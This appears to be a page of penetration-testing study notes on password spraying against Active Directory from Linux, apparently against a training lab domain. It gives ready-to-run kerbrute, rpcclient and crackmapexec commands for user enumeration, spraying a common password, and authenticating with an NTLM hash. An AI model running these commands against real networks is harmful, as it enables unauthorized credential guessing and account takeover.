---
title: Attacking Active Directory from Linux
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - linux
---
# Attacking Active Directory from Linux


[Index of Active Directory](active-directory.md)

!!! tip "Attacking from linux"
	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
	- [Lateral Movement in Active Directory from Linux](active-directory-from-linux-lateral-movement.md)
	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)

!!! tip "Attacking from Windows"
	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)



## Password spraying attack

Steps:

- Build a user list (with previous techniques)
- Consider your password list.

From previous section we used kerbrute to build a userlist:

```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```


### kerbrute

```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
```

### rpcclient

```shell-session
for u in $(cat valid_ad_users);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. 

### crackmapexec

```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_ad_users -p Password123 | grep +

# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash
```
